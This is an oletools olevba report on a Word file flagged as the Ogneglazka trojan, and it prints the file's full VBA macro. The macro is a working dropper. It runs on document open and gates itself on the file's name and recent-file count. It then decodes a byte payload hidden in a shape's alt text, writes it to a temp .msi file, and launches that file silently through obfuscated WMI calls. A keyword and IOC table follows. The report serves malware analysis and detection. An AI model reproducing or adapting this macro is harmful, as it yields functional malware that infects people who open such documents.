olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Ogneglazka.gen-6d6f5c2de3fb7cbf95e61599c0e5937e9c0ef824cd43025b7d74204104e6e420
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Ogneglazka.gen-6d6f5c2de3fb7cbf95e61599c0e5937e9c0ef824cd43025b7d74204104e6e420 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Sub ValVersion()
    On Error Resume Next
    Dim intFileNum As Integer
    Dim byteTemp As Byte
    Dim strByte1 As String
    Dim i, j, k As Double
    Dim strIn As String
    Dim blnDone As Boolean
    intFileNum = FreeFile
    Dim dropPath As String
    
    dropPath = Environ("LOCALAPPDATA") & "\Temp\wct2CEBA.msi"

    Open dropPath For Binary As intFileNum
    
    Dim mBox As shape
    Set mBox = readShapebyAltText("MKLASFU")

    strIn = mBox.TextFrame.TextRange.Text
    
    mBox.TextFrame.TextRange.Text = ""
    
    blnDone = False
    i = 1
    j = 1

    Do While Not blnDone
        k = InStr(i + 1, strIn, ";")
        If k = 0 Then
            blnDone = True
        Else
            blnDone = False
            strByte1 = Mid(strIn, i + 1, k - i - 1)
            Put intFileNum, , CByte(strByte1)
            i = k
            strByte1 = ""
            j = j + 1
            End If
    Loop
    Close intFileNum
End Sub


Sub ClearPriv()
    Dim mPic As shape
    Set mPic = readShapebyAltText("PrivFilter")
    Selection.WholeStory
    Selection.Font.Color = -587137025
    mPic.Delete
    
End Sub


Sub CheckFltr()
    ValVersion
    Const WHAT = 12
    blah = "C:\Windows\System32\msiexec.exe /i " & Environ("LOCALAPPDATA") & "\Temp\wct2CEBA.msi"
    Set serveYa = GetObject("wi" & "nmg" & "mts:\\.\r" & "oot\ci" & "mv2")
    Set startYa = serveYa.Get("Wi" & "n32_Pr" & "oce" & "ssS" & "tartup")
    Set whatYa = startYa.SpawnInstance_
    whatYa.ShowWindow = WHAT
    Set procYa = GetObject("wi" & "nm" & "gmt" & "s:r" & "oot\ci" & "mv2:W" & "in32_P" & "rocess")
    res = procYa.Create(blah, Null, whatYa, processid)
    

End Sub

Sub submit_button()

    Dim sample
    sample = "Double click button to submit."

    Selection.Find.ClearFormatting
    Selection.Find.Replacement.ClearFormatting
    With Selection.Find
        .Text = sample
        .Replacement.Text = "Successfully Submitted!"
        .Forward = True
        .Wrap = wdFindContinue
        .Format = False
        .MatchCase = False
        .MatchWholeWord = False
        .MatchWildcards = False
        .MatchSoundsLike = False
        .MatchAllWordForms = False
    End With
    Selection.Find.Execute Replace:=wdReplaceAll

End Sub

Function readShapebyAltText(altText As String) As shape
Dim shape As Variant

For Each shape In ActiveDocument.Shapes
    If shape.AlternativeText = altText Then
        Set readShapebyAltText = shape
        Exit Function
    End If
Next
End Function

Private Sub Document_Open()
    FixErrors
End Sub

Function FixErrors() As Boolean
   On Error Resume Next
   ClearPriv
    If ActiveDocument.Name = "Designazione AdS V02R02.doc" Then
        FixErrors = False
        ClearPriv
        CheckFltr
    ElseIf Application.RecentFiles.Count < 3 Then
        FixErrors = False
        ClearPriv
    Else
        FixErrors = True
        ClearPriv
    End If

End Function

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|ShowWindow          |May hide the application                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |wct2CEBA.msi        |Executable file name                         |
|IOC       |msiexec.exe         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

